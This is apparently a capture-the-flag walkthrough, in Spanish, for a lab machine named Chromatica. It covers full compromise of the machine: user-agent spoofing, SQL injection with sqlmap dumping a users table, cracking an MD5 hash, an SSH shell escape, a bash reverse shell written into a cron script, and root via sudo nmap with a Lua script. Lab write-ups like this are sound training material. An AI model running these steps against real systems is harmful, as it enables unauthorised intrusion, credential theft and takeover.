Resolución de la Maquina Chromatica

# Escaneo de puertos
```
sudo nmap -p- -open -sS -sC -sV -Pn 10.0.2.12 -vvv
```


El resultado es evidente en el puerto 80 hay un servicio http en el 22 un ssh y el 5353  parece ser  un servicio para redireccionar DNS

#### Entrando a la web

Se puede observar que ingresamos normalmente al sitio como cualquier otro


Ahora por regla general debemos buscar 2 archivos de configuración el primero es el robots.txt y el segundo es el sitemap.txt  
probé el robots.txt y dio resultado  


Ahora aquí debemos tirar de burpsuite para pasar la cabecera user-agent a la ruta dev-portal.
encendemos el fozy-proxi, y metemos la ruta /dev-portal/
en principio debe salir que no tenemos permiso a la web 
![[Pasted image 20240526135607.png]]
ahora tiramos del burpsuite, modificamos la cabecera user-agent 
![[Pasted image 20240526135708.png]]
y listo tenemos acceso a un input
![[Pasted image 20240526135813.png]]
si inspeccionamos la pagina 
![[Pasted image 20240526135929.png]]
vemos que hay una acción de tipo search.php por lo que vamos a usarla en la url, sin apagar el burpsuite usamos la misma cabecera dev, lo que nos devuelve un listado con los valores de la base de datos.
![[Pasted image 20240526140244.png]]
en este punto podríamos validar si es vulnerable a [[2-Sql Inyection]] agregando al final de la url ?city=Chicago
![[Pasted image 20240526140611.png]]
podemos asumir que las consultas hechas por la URL funcionan, ahora probemos si es vulnerable a SQLI con un  " OR 1 =  1 "
![[Pasted image 20240526141854.png]]
nos dice que no hay resultados para mostrar por lo que es vulnerable a sql inyection
ahora vamos a usar sqlmap
##### Usando SQL map

```
sqlmap -u 'http://10.0.2.12/dev-portal/search.php?city=p*' -H 'user-agent:dev' --dbs --tables --exclude-sysdbs
```
	

![[Pasted image 20240526142252.png]]

ahora tenemos acceso a la base de datos atraves de sqlmap y la base de datos se llama chromatica
entonces usaremos 
```
 sqlmap -u 'http://10.0.2.12/dev-portal/search.php?city=p*' -H 'user-agent:dev' --dbs --tables --exclude-sysdbs -D Chromatica -T users --dump 
```

	- H es para indicar la cabecera
	 - D es para indicar la DataBaSe 
	- T es para indicar la tabla a utilizar 
	-- dump es para verter o sacar lo que hay en esa tabla
una vez ejecutado. vemos lo siguiente en la tabla usuarios.
![[Pasted image 20240526144043.png]]
ahora podemos usar Name-That-Hash para saber que tipo de encriptación tienen
paso el comando nth -t 1ea6762d9b86b5676052d1ebd5f649d7 --accessible
y sale como resultado 
 que lo mas probable es que sea md5
 ![[Pasted image 20240526150743.png]]
 una vez identificado el tipo de hash vamos a usar hashcat (forma dificil y lenta usando fuerza bruta)
 o vamos a una web que ya tenga crackeado todo y lo sacamos de allí 
 en este caso lo sacamos de crackstation
 ![[Pasted image 20240526153134.png]]
 ahora vamos a conectarnos por SSH
 #### conexión SSH
	 hacemos un ssh dev@10.0.2.12
	 nos sale un error 

 ![[Pasted image 20240526153636.png]]
 pero que pasa si reducimos el tamaño de la consola?
 ![[Pasted image 20240526153852.png]]
 y escribimos !bash
 al parecer hay un error en ssh que cuando reduces la consola te deja insertar comandos y así puedes ejecutar una shell 
 ![[Pasted image 20240526154158.png]]
 ya estamos dentro de el usuario dev
 
 ## Escalar privilegios
 primero aremos  el tratamiento de la TTY
```
1 script /dev/null  -c bash pulsamos control +z
2  stty raw -echo; fg
3 enter, escribimos reset y nuevamente enter
4 escribimos xterm
5 hacemos export TERM=xterm y export SHELL=bash
listo con esto tratamos la TTY
```

lo siguiente es investigar las rutas tipicas :
![[Pasted image 20240527154750.png]]
en este caso en la carpeta /otp encontramos un script  y vemos que tenemos permisos de ejecución, lectura y escritura.
**![[Pasted image 20240527155736.png]]**
modificamos y metemos una reverse con bash
```
bash -i >& /dev/tcp/10.0.2.12/443 0>&1
```
ponemos un puerto a la escucha en el puerto 443
esperamos que se ejecute la tarea de crontab.
![[Pasted image 20240527160417.png]]
tenemos acceso a otro user
tratamos la TTY y luego un sudo -l
![[Pasted image 20240527161127.png]]
aqui nos dice que podemos ejecutar nmap de forma nativa y sin contraseñas (pide ser sudo )
ahora hacemos lo siguiente
``` bash
TF=$(mktemp)

echo 'os.execute("/bin/bash && SHELL=/bin/bash script -q 2>/dev/null ")' > $TF

sudo nmap --script=$TF
```

una vez ejecutado todo ya tendremos acceso a root 
![[Pasted image 20240527173001.png]]